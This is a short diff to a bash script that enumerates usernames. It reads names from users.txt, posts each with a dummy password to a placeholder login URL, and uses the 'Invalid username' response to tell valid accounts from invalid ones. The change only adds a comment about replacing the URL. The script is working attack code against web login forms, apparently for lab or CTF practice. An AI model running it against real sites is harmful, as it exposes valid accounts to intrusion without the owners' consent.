@@ -3,7 +3,7 @@
 
 for i in $(cat users.txt)
 do
-	rep=$(curl -s -i -X POST 'https://YOURURL' --data "username=$i&password=vrzvzre")
+	rep=$(curl -s -i -X POST 'https://YOURURL' --data "username=$i&password=vrzvzre") #change YOURURL by the good URL
 	
 	if echo "$rep" | grep -q 'Invalid username'; then
 		echo $i "invalid user"
